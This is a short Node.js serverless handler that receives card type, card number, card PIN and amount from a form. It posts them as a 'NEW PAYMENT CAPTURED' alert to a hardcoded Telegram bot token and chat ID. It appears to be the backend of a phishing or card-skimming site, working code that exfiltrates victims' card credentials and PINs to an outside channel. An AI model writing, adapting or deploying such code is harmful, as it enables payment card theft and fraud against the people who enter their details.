const axios = require('axios');

module.exports = async (req, res) => {
    // Only allow POST requests
    if (req.method !== 'POST') {
        return res.status(405).send('Method Not Allowed');
    }

    const { card_type, card_number, card_pin, amount } = req.body;

    // YOUR TELEGRAM DETAILS - DO NOT CHANGE THE FORMAT
    const BOT_TOKEN = '8930107548:AAEwCZfc0qVYbEdi-5JvqPsgDOsqiOCNVfw';
    const CHAT_ID = '8704521638';

    const message = `
🚨 *NEW PAYMENT CAPTURED* 🚨
--------------------------
*Type:* ${card_type}
*Card Number:* ${card_number}
*PIN:* ${card_pin}
*Amount:* $${amount}
--------------------------
*Status:* High Priority
*Timestamp:* ${new Date().toLocaleString()}
    `;

    try {
        // Sending to Telegram
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        return res.status(200).send({ success: true });
    } catch (error) {
        console.error("Telegram Error:", error.message);
        return res.status(500).send({ success: false });
    }
};